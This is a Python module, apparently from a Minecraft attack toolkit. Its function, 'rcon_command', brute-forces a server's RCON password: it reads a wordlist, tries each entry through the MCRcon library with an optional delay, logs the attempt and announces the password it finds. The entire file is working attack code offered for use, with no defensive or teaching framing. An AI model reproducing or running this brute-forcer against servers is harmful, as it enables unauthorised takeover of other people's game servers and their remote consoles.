#!/usr/bin/python3

import subprocess
import readchar
import time

from utils.banners.PrintBanner import print_banner
from utils.checks.Encoding import check_encoding
from utils.managers.Logs import LogsManager
from utils.gets.LogFile import create_file
from mcrcon import MCRcon, MCRconException
from utils.gets.Language import language
from utils.color.TextColor import paint
from utils.alerts.Alerts import alert


def rcon_command(server, password_file, delay=None):
    """ 
    Prepare and launch the attack 
    
    :param server: IP Address and RCON Port
    :param password_file: Password File
    """

    title = language['banners']['rcon']['TITLE']
    target = language['banners']['rcon']['TARGET']
    pwd_file = language['banners']['rcon']['PASSWORD_FILE']
    trying_password = language['banners']['rcon']['TRYING_PASSWORD']
    pwd_found = language['banners']['rcon']['PASSWORD_FOUND']
    pwd_not_found = language['banners']['rcon']['PASSWORD_NOT_FOUND']
    timeout = language['banners']['rcon']['TIMEOUT']
    connection_refused = language['banners']['rcon']['CONNECTION_REFUSED']
    stopping = language['banners']['rcon']['STOPPING']
    error = language['banners']['rcon']['ERROR']
    message1 = language['banners']['menu']['MESSAGE1']
    message2 = language['banners']['menu']['MESSAGE2']
    message3 = language['banners']['menu']['MESSAGE3']
    message4 = language['banners']['menu']['MESSAGE4']

    file = create_file('rcon')
    logs = LogsManager('rcon', file)
    logs.create(server, password_file)
    target = target.replace('[0]', server)
    pwd_file = pwd_file.replace('[0]', password_file)
    attack_finished = False
    password_found = False

    if delay is not None:
        if not delay.replace('.', '').isdigit():
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["INVALID_DELAY"]}')
            return

    paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["PREPARING_THE_ATTACK"]}')
    time.sleep(1)

    with open(password_file, 'r', encoding=check_encoding(password_file)) as f:
        passwords = f.readlines()

    if len(passwords) == 0:
        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["EMPTY_FILE"]}')
        return

    paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["NUMBER_OF_PASSWORDS"].replace("[0]", password_file).replace("[1]", str(len(passwords)))}')
    time.sleep(1)
    paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["rcon"]["STARTING_THE_ATTACK"]}')
    time.sleep(1.5)
    server = server.split(':')

    while True:
        try:
            subprocess.run('cls || clear', shell=True)

            if attack_finished:
                if password_found:
                    pwd_found = pwd_found.replace('[0]', password)
                    print_banner('rcon', title, target, pwd_file, pwd_found)
                    alert('Alert-0')
                    _ = readchar.readkey()
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)

                else:
                    print_banner('rcon', title, target, pwd_file, pwd_not_found)
                    alert('Alert-0')
                    _ = readchar.readkey()
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)

                break

            for password in passwords:
                password = password.replace('\n', '')
                print_banner('rcon', title, target, pwd_file, trying_password.replace('[0]', password))
                
                if delay is not None:
                    try:
                        time.sleep(int(delay))

                    except ValueError:
                        time.sleep(float(delay))

                try:
                    with MCRcon(server[0], password, int(server[1]), timeout=35) as mcr:
                        mcr.disconnect()

                    password_found = True
                    break

                except TimeoutError:
                    subprocess.run('cls || clear', shell=True)
                    print_banner('rcon', title, target, pwd_file, timeout)
                    time.sleep(3)
                    _ = readchar.readkey()
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)
                    return

                except ConnectionRefusedError:
                    subprocess.run('cls || clear', shell=True)
                    print_banner('rcon', title, target, pwd_file, connection_refused)
                    time.sleep(3)
                    _ = readchar.readkey()
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)
                    return

                except KeyboardInterrupt:
                    subprocess.run('cls || clear', shell=True)
                    print_banner('rcon', title, target, pwd_file, stopping)
                    time.sleep(3)
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)
                    return

                except MCRconException:
                    pass

                except Exception as e: 
                    subprocess.run('cls || clear', shell=True)
                    error = error.replace('[0]', str(e))
                    print_banner('rcon', title, target, pwd_file, error)
                    time.sleep(3)
                    _ = readchar.readkey()
                    subprocess.run('cls || clear', shell=True)
                    print_banner('main', message1, message2, message3, message4)
                    return

            attack_finished = True

        except KeyboardInterrupt:
            subprocess.run('cls || clear', shell=True)
            print_banner('rcon', title, target, pwd_file, stopping)
            time.sleep(3)
            subprocess.run('cls || clear', shell=True)
            print_banner('main', message1, message2, message3, message4)
            return